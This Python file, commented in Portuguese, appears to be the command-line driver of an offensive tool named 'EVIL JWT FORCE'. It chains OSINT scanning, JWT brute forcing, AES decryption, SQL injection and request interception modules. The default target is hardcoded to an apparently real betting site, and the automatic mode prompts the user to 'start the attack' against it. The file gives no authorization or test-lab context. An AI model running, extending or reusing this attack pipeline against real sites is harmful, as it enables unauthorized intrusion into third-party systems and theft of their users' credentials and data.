#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import argparse
import importlib
from pathlib import Path

# Garante que o diretório raiz (EVIL_JWT_FORCE) esteja no sys.path
ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

# Imports dos módulos internos
from utils.logger import get_logger
from config.settings import get_setting
import yaml

# Banner do sistema
BANNER = r"""
╔══════════════════════════════════════════════════════╗
║              ███████╗██╗   ██╗██╗██╗                 ║
║              ██╔════╝██║   ██║██║██║                 ║
║              █████╗  ██║   ██║██║██║                 ║
║              ██╔══╝  ╚██╗ ██╔╝██║██║                 ║
║              ███████╗ ╚████╔╝ ██║███████╗            ║
║              ╚══════╝  ╚═══╝  ╚═╝╚══════╝            ║
║               EVIL JWT FORCE - CLI Engine            ║
╚══════════════════════════════════════════════════════╝
"""

OPTIONS = {
    "1": "Execução Automática (Modo Full)",
    "2": "Execução Manual (Escolher Etapas)",
    "3": "Sair"
}

MODULES = {
    "auth":      ("core.auth", "Authenticator"),
    "wordlist":  ("core.wordlist_generator", "run"),
    "bruteforce":("core.bruteforce", "JWTBruteforcer"),
    "aes":       ("core.aes_decrypt", "run"),
    "sql":       ("core.sql_injector", "SQLInjector"),
    "sentry":    ("core.sentry_simulator", "run"),
    "report":    ("core.report", "generate_report"),
    "osint":     ("core.osint", "OSINTScanner")
}

logger = get_logger("EVIL_JWT_FORCE.cli")

def print_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    for k, v in OPTIONS.items():
        print(f"[{k}] {v}")
    print()

def run_module(module_key, **kwargs):
    """Executa um módulo pelo nome da chave do dicionário MODULES."""
    if module_key not in MODULES:
        logger.error(f"Módulo '{module_key}' não encontrado.")
        return
    module_path, symbol = MODULES[module_key]
    try:
        mod = importlib.import_module(module_path)
        if symbol in ["SQLInjector", "OSINTScanner"]:
            instance = getattr(mod, symbol)()
            if 'target_url' in kwargs:
                instance.target_url = kwargs.get('target_url')
            instance.run()
        elif symbol == "Authenticator":
            target_url = kwargs.get('target_url', 'https://d333bet.com/')
            instance = getattr(mod, symbol)(target_url=target_url)
            instance.run()
        elif module_key == "sentry":
            func = getattr(mod, symbol)
            if 'target_url' in kwargs:
                module_instance = func(target_url=kwargs.get('target_url'))
            else:
                module_instance = func()
            if hasattr(module_instance, 'run'):
                module_instance.run()
            else:
                logger.warning(f"Módulo {module_key} não possui método 'run'.")
        else:
            func = getattr(mod, symbol)
            token = kwargs.get('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c')
            module_instance = func(token=token) if callable(func) and symbol in ["JWTBruteforcer"] else func()
            if hasattr(module_instance, 'run'):
                module_instance.run()
            else:
                logger.warning(f"Módulo {module_key} não possui método 'run'.")
        logger.info(f"Módulo '{module_key}' executado com sucesso.")
    except Exception as e:
        logger.error(f"Erro ao executar módulo '{module_key}': {e}", exc_info=True)

def run_automatic_mode():
    print("Executando modo automatico completo...\n")
    target_url = getattr(run_automatic_mode, 'target_url', 'https://d333bet.com/')
    if not target_url:
        target_url = "https://d333bet.com/"
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    input("Tecle enter para iniciar o ataque")
    time.sleep(0.5)
    try:
        print("Iniciando interceptação de requisições...")
        # Ativando interceptação de requisições com o módulo sentry_simulator
        run_module("sentry", target_url=target_url)
        print("Interceptação concluída. Prosseguindo com outros módulos...")
        # Aqui poderia haver uma lógica para análise de requisições capturadas, mas por enquanto seguimos com os outros módulos
        run_module("osint", target_url=target_url)
        run_module("auth", target_url=target_url)
        run_module("wordlist", target_url=target_url)
        run_module("bruteforce")
        run_module("aes", target_url=target_url)
        run_module("sql")
        run_module("report")
        print("\nExecucao automatica finalizada. Relatorio salvo em: reports/report.html\n")
    except Exception as e:
        logger.error(f"Erro durante a execucao automatica: {e}", exc_info=True)
    input("Pressione Enter para retornar ao menu...")

def run_manual_mode():
    print("\n📦 Módulos disponíveis:")
    steps = [
        ("Autenticação", "auth"),
        ("OSINT Scanning", "osint"),
        ("Gerar Wordlist", "wordlist"),
        ("Brute Force JWT", "bruteforce"),
        ("Descriptografar AES", "aes"),
        ("SQL Injection", "sql"),
        ("Simular Sentry", "sentry"),
        ("Gerar Relatório", "report"),
        ("Voltar", None)
    ]
    while True:
        for idx, (label, _) in enumerate(steps, 1):
            print(f"[{idx}] {label}")
        choice = input("\nEscolha o módulo a executar: ").strip()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(steps):
            print("❌ Opção inválida. Tente novamente.")
            continue
        idx = int(choice) - 1
        if steps[idx][1] is None:
            break
        print(f"\n▶ Executando {steps[idx][0]}...\n")
        try:
            run_module(steps[idx][1])
            print(f"✅ {steps[idx][0]} finalizado.\n")
        except Exception as e:
            logger.error(f"Erro no módulo {steps[idx][0]}: {e}", exc_info=True)

def parse_args():
    parser = argparse.ArgumentParser(description="EVIL_JWT_FORCE CLI")
    parser.add_argument("--auto", action="store_true", help="Executa modo automático")
    parser.add_argument("--manual", action="store_true", help="Executa modo manual")
    parser.add_argument("--config", type=str, help="Arquivo de configuração YAML personalizado")
    return parser.parse_args()

def load_config(config_path=None):
    """Carrega configuração YAML customizada se fornecida."""
    if config_path:
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                config = yaml.safe_load(f)
                logger.info(f"Configuração carregada de {config_path}")
                return config
        except Exception as e:
            logger.error(f"Erro ao carregar configuração customizada: {e}")
    # fallback para config padrão
    return get_setting

def main():
    args = parse_args()
    config = load_config(args.config)  # Carrega config customizada se houver

    if args.auto:
        run_automatic_mode()
        return
    elif args.manual:
        run_manual_mode()
        return

    while True:
        print_menu()
        choice = input("Escolha uma opção: ").strip()
        if choice == "1":
            run_automatic_mode()
        elif choice == "2":
            run_manual_mode()
        elif choice == "3":
            print("\n👋 Encerrando EVIL JWT FORCE...")
            time.sleep(1)
            break
        else:
            print("❌ Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()